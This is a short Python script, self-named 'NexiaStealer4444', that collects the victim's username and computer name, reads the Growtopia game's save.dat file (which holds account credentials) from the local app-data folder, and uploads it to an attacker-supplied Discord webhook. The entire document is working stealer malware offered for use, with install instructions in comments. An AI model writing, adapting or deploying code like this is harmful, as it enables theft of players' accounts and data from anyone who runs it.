import socket
import os
from os import getenv
from discord_webhook import DiscordWebhook, DiscordEmbed

# require
# pip3 install discord.py
# pip3 install discord_webhook
# Webhook Url's / Use private key !

a="" # Webhook URL
b="New Account From: "+getenv("username")+" / "+socket.gethostname()
webhook = DiscordWebhook(url=a, username="NexiaStealer4444",content=b)

c=getenv("LOCALAPPDATA")+ "\\Growtopia\\save.dat"
with open(c, "rb") as f:
webhook.add_file(file=f.read(), filename='save.dat')
response = webhook.execute()
